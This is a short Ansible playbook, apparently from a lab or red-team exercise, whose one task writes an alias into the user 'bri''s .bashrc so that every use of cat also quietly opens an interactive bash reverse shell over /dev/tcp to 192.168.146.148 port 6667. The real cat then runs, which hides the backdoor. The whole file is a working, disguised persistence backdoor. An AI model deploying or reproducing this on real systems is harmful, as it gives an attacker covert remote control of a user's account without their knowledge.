---
- name: "made an alias for cat to open reverse shell"
  become: yes
  tasks:
    - name: "make alias for cat"
      lineinfile:
        path: /home/bri/.bashrc
        line: "alias cat='f(){ (script -c \"bash -i\" /dev/null </dev/tcp/192.168.146.148/6667 >&0 2>&1 &); cat \"$@\"; unset -f f; }; f'"

